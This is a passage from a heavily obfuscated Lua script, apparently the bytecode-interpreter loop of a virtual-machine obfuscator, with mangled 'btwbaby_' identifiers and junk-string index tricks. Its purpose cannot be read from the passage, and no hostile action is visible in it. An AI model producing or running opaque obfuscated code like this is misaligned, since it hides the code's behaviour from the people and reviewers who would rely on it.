111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("8eJ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("pl")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("hO5")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Y3")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Rv2")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0Nz4")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4T")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("zSy")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{109;63;64;569};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("99")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("a4s")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("54")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kHt")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("qYJU")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Kr")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("vaf")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("H9")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("kkb")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("OL")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("TZA")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("D8")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZMY")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jr")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("JIc")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Yq")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("P0D")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7EdU")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rx")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{852;925;766;61};{608;267;689;638};{299;694;280;213};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eH")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kTh")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("VaAG")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ViK")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Lk")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("IyW")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Lr")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("taJ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uM")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("rRu")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("mQ")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("g51")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("NM")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("E3V")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2c9I")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Gu")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IeY")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("fu")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("DkR")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Pl")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{590;583;501;691};{901;970;979;942};{545;158;989;986};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("DefY")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZO")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("cRY")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Gmet")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GG")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("WHf")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{232;738;540;759};"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Xp")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("q3T")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Cd")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{280;813;713;760};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{228;626;221;237};{848;472;214;678};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("W2")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("2E6")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Qn")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ydJ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PL")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jrc")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("QO")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("sI1")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("OJ")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("WOv")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0m2G")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hk")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("gP1")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("gn33")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("a5")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Xgo")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jK5h")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("FW")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("vWh")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3ypf")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8Z")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BCi")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("jz")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ces")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("I6gC")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zk")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("iuM")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kT")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("E6v")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nA")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("cAq")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wa")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("7ui")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gi")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("N9d")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qqBD")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{724;903;584;454};{617;543;379;264};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Y4h")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("asJC")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IQ")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("j2S")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{132;891;751;758};"1 + 1 = 111";}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ANq")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("plKQ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Cq")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("uxq")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dS")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("dxD")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IF")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("VHM")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lr")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("GAm")];else btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mE")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{717;521;915;679};"1 + 1 = 111";}]];end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("PFhmt")then if btwbaby_IIlIllIIlIlIIlIIIl==#("G13e")then local btwbaby_IIIllIlIIlI=btwbaby_IllIIIllIlIIIIIlIIIllII[#("U3")];local btwbaby_llIIllIll=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{387;992;325;630};{814;210;275;694};"1 + 1 = 111";}]];btwbaby_llllIllI[btwbaby_IIIllIlIIlI+1]=btwbaby_llIIllIll;btwbaby_llllIllI[btwbaby_IIIllIlIIlI]=btwbaby_llIIllIll[btwbaby_IllIIIllIlIIIIIlIIIllII[#("stlt")]];else local btwbaby_IIlIllIIlIlIIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("To")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("mYu")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zz")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("oFs")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ml")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jJy")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("jM")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("exi")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("uC")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("GmF")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BT")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rmr")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("SQOt")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uk")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PNH")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Tn")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cnQ")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("47Tm")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("y5")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mbI")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("4fBz")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IK")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("c1M")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZWBg")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hY")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("onW")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("1aDu")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("tm")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cMa")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lc")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("XuH")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("RXJH")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("EB")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("I27")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Az")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{135;2;248;100};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("C1")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("8Yv")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("TV")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("2fy")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vz")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{702;109;964;177};{860;387;122;378};"1 + 1 = 111";}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nUWI")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("da")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Knd")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("KMhp")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{518;346;824;110};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{589;676;799;365};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("cJvZ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("We")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{228;583;836;109};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kVlY")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Lb")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Q2V")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("6a")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eIR")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("G3ev")]];btwbaby_llIIllIl